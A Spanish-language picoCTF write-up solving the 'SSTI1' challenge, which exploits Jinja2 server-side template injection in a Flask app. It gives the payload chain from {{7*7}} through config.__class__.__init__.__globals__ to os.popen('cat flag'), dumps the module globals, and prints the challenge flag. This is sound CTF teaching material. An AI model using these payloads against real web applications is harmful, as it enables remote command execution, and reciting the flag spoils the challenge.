### Descripción
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps!
#### Una vez iniciada la instancia del desafío:
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:59731/)!
### Solución
Iniciamos dando clic en el enlace del sitio proporcionado por la descripción después de iniciada la instancia del reto, donde nos encontraremos lo siguiente:

![[Pasted image 20250412144404.png]]

Luego para saber en que sitio estamos trabajando, procedemos a usar la consola para que nos arroje más datos sobre el mismo, obteniendo lo siguiente:

```shell
jony@DESKTOP-TN1UVD2:~$ whatweb http://rescued-float.picoctf.net:59731/
http://rescued-float.picoctf.net:59731/ [200 OK] Country[UNITED STATES][US], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.8.10], IP[3.20.79.114], Python[3.8.10], Title[SSTI1], Werkzeug[3.0.3]
```

Una vez que sabemos que utiliza python, utiliza una plantilla Jinja, por lo cual se buscan comandos en línea para probar si la página tiene vulnerabilidades, en este caso usamos `{{7*7}}` para comprobar que en realidad haya un SSTI:

![[Pasted image 20250412144734.png]]

Ahora ejecutamos un payload como lo es: `{{''.__class__}}` para exploración básica del entorno donde obtenemos ahora lo siguiente:

![[Pasted image 20250412144917.png]]

En seguida probamos con: `{{ config.__class__}}` para seguir conociendo más detalles como lo es el objeto **config**, como se aprecia a continaución:

![[Pasted image 20250412145146.png]]

Ahora hacemos uso de `{{ config.__class__.__init__}}` para poder intentar acceder al método constructor de la clase config:

![[Pasted image 20250412145413.png]]

Ahora probamos con `{{ config.__class__.__init__.__globals__}}` para revisar todo lo que fue **importado o definido globalmente** en el módulo donde se definió, que en este caso es el de **config**:

```
{'__name__': 'flask.config', '__doc__': None, '__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7ae5b7a8c7c0>, '__spec__': ModuleSpec(name='flask.config', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7ae5b7a8c7c0>, origin='/usr/local/lib/python3.8/dist-packages/flask/config.py'), '__file__': '/usr/local/lib/python3.8/dist-packages/flask/config.py', '__cached__': '/usr/local/lib/python3.8/dist-packages/flask/__pycache__/config.cpython-38.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'annotations': _Feature((3, 7, 0, 'beta', 1), (3, 10, 0, 'alpha', 0), 16777216), 'errno': <module 'errno' (built-in)>, 'json': <module 'json' from '/usr/lib/python3.8/json/__init__.py'>, 'os': <module 'os' from '/usr/lib/python3.8/os.py'>, 'types': <module 'types' from '/usr/lib/python3.8/types.py'>, 't': <module 'typing' from '/usr/lib/python3.8/typing.py'>, 'import_string': <function import_string at 0x7ae5b7d5a820>, 'T': ~T, 'ConfigAttribute': <class 'flask.config.ConfigAttribute'>, 'Config': <class 'flask.config.Config'>}
```

Por lo que sigue de probar es `{{config.__class__.__init__.__globals__['os']}}` con esto es el último paso para poder ejecutar comandos, ya que con este accedemos al modulo **os** de python:

![[Captura de pantalla 2025-04-12 160133.png]]

Al obtener una respuesta positiva, procedemos a ejecutar el comando **cat** para revisar el contenido de un archivo **flag**, en caso de que exista, sino se puede probar con más nombres, resultando el payload en `{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}`.

Después de ejecutar el comando obtenemos la bandera que da solución al reto:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_df9a00a0}
```
### Notas Adicionales

### Referencias
https://jinja.palletsprojects.com/en/stable/
https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/